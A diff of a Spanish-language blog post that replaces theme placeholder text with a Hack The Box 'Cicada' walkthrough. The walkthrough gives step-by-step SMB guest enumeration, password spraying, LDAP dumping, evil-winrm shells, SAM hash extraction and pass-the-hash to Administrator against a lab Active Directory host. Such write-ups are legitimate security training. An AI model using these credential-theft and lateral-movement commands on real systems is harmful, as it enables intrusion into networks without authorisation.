@@ -11,15 +11,14 @@ En este writeup, exploramos la máquina Cicada de Hack The Box, donde explotamos
 Empezaré por scanear todos los protocolos en la máquina objetivo:
   1. Escanear los puertos abiertos.
   2. Escanear los servicios en cada puerto que esté abierto.
-  ```js
-  // Javascript code with syntax highlighting.
-  nmap -sCV -v 10.10.11.35 -Pn -T3
-  ```
-  Como resultado encontramos esto:
-  ```js
-  // Javascript code with syntax highlighting.
+	
+		nmap -sCV -v 10.10.11.35 -Pn -T3
+	
+Como resultado encontramos esto:
+  ```ruby
+  
   Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-	Starting Nmap 7.93 (https://nmap.org ) at 2024-10-02 12:18 CEST
+	Starting Nmap 7.93 https:nmap.org at 2024-10-02 12:18 CEST
 	NSE: Loaded 155 scripts for scanning.
 	NSE: Script Pre-scanning.
 	Initiating NSE at 12:18
@@ -80,7 +79,7 @@ Empezaré por scanear todos los protocolos en la máquina objetivo:
 	464/tcp  open  kpasswd5?
 	593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 	636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
-  ```
+```
 
   En especial encontramos un Active Directory (CICADA-DC.cicada.htb)
 
@@ -91,96 +90,115 @@ Empezaré por scanear todos los protocolos en la máquina objetivo:
 El foothold en esta máquina es fácil. Vamos a probar un par de cosas:
 
 
-### [](#header-3)Header 3
+Vamos a intentar conectarnos con la herramienta NetExec mediante SMB con el usuario "guest" a ver si podemos:
 
 ```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
+❯ netexec smb 10.10.11.35 -u 'guest' -p '
 ```
-
+Y nos deja conectarnos:
 ```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
+	[*] First time use detected
+	[*] Creating home directory structure
+	[*] Creating missing folder logs
+	[*] Creating missing folder modules
+	[*] Creating missing folder protocols
+	[*] Creating missing folder workspaces
+	[*] Creating missing folder obfuscated_scripts
+	[*] Creating missing folder screenshots
+	[*] Creating default workspace
+	[*] Initializing FTP protocol database
+	[*] Initializing LDAP protocol database
+	[*] Initializing MSSQL protocol database
+	[*] Initializing RDP protocol database
+	[*] Initializing SMB protocol database
+	[*] Initializing SSH protocol database
+	[*] Initializing VNC protocol database
+	[*] Initializing WINRM protocol database
+	[*] Initializing WMI protocol database
+	[*] Copying default configuration file
+	SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+	SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
 ```
+Ahora voy a proceder a listar las carpetas que se comparte y encontramos algunas que pueden contener información sensible:
 
-#### [](#header-4)Header 4
-
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-
-##### [](#header-5)Header 5
-
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
-
-
-### There's a horizontal rule below this.
-
-* * *
-
-### Here is an unordered list:
-
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
-
-### And an ordered list:
-
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
-
-### And a nested list:
-
-- level 1 item
-  - level 2 item
-  - level 2 item
-	- level 3 item
-	- level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-
-### Small image
-
-![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)
-
-### Large image
-
-![](https://guides.github.com/activities/hello-world/branching.png)
-
-
-### Definition lists can be used with HTML syntax.
-
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
-
+```js
+❯ netexec smb 10.10.11.35 -u 'guest' -p '' --shares
 ```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
+Y encontramos dos carpetas que son de nuestros interes, HR y DEV, voy a intentar acceder a HR a ver si puedo encontrar algo:
+```js
+smbclient //10.10.11.35/HR
 ```
+```js
+smb: \> ls
+	  .                                   D        0  Thu Mar 14 13:29:09 2024
+	  ..                                  D        0  Thu Mar 14 13:21:29 2024
+	  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024
+```
+Y encontramos un .txt en el que dentro de el se encuentra una credencial.
+![Texto alternativo](/assets/cicada.png)
 
+Ahora con los usuarios que encontramos en SidTypeUser con este comando:
+```js
+cme smb 10.10.11.35 -u 'guest' -p '' --rid-brute | grep SidTypeUser
 ```
-The final element.
+Lo metemos en un archivo y aplicamos fuerza bruta para probar esa credencial con todos los usuarios que hemos encontrado:
+```js
+netexec smb 10.10.11.35 -u users.list -p 'Credencial'
 ```
+Y vemos que esa credencial coincide con el usuario "michael".
+![Texto alternativo](/assets/cicada2.png)
+
+Ahora con dumpear toda la información que podamos logueados como este usuario:
+```js
+ldapdomaindump ldap:/10.10.11.35 -u 'cicada.htb\michael.wrightson' -p "Credencial"
+```
+![Texto alternativo](/assets/cicada3.png)
+
+Y mirando entre estos archivos, encontramos otra credencial, en este caso de el usuario "david" dentro del archivo (domain_users.grep).
+
+Esta credencial y usuario nos va a permitir acceder a los archivos que se encuentra dentro de la carpeta DEV, ya que con el usuario "michael" no podía acceder.
+![Texto alternativo](/assets/cicada4.png)
+![Texto altenativo](/assets/cicada5.png)
+
+Encontramos otra credencial dentro de ese archivo .ps1
+Asique ahora mediante evil-winrm nos vamos a conectar al AD en busca de la user flag.
+```js
+evil-winrm -i 'cicada.htb' -u 'emily.oscars' -p 'Credencial'
+```
+Y ya estamos dentro:
+
+![Texto altenativo](/assets/cicada6.png)
+
+Si buscamos un poco por los directorios, encontramos la user flag:
+![Texto altenativo](/assets/cicada7.png)
+
+# [](#header-1)Escalada de Privilegios
+
+Primero de todo voy a ver sobre que tengo privilegios:
+
+![Texto altenativo](/assets/cicada8.png)
+
+Lo que voy a hacer ahora es extraer la base de datos SAM para extraer los hashes NTLM/NTHash que estan almacenadas en el sistema:
+```js
+pypykatz registry --sam sam system
+```
+```js
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+	Administrator:500:NTHASHDELUSUARIOADMINISTRATOR*********
+	*******:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
+	0:::
+	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
+	d7e0c089c0:::
+```
+Ahora una vez conseguido ese NTHash del usuario "Administrator" nos logueamos utilizando evil-winrm:
+```js
+evil-winrm -i 10.10.11.35 -u administrator -H "NTHASHdeAdministator"
+```
+Y ya encontrariamos la root flag.
+
+![Texto altenativo](/assets/cicada9.png)
+
+
+PWNED!
